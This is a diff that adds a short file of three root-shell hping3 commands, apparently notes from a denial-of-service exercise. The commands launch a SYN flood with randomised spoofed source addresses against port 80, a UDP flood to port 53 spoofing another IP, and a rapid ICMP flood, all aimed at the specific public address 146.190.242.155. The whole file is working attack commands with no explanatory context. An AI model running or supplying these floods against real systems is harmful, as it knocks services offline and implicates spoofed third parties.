@@ -1,0 +1,6 @@
+1.) root@lamponubuntu2204-s-1vcpu-1gb-amd-tor1-01:/var/www/html# hping3 -S -c 10000 -p 80 --flood --rand-source 146.190.242.155
+
+2.) root@lamponubuntu2204-s-1vcpu-1gb-amd-tor1-01:/var/www/html# hping3 -2 -c 9000 -p 53 --faster --spoof 142.93.153.51 146.190.242.155
+
+3.) root@lamponubuntu2204-s-1vcpu-1gb-amd-tor1-01:/var/www/html# hping3 -1 -c 11000 -d 1000 -i 0.01333 146.190.242.155
+
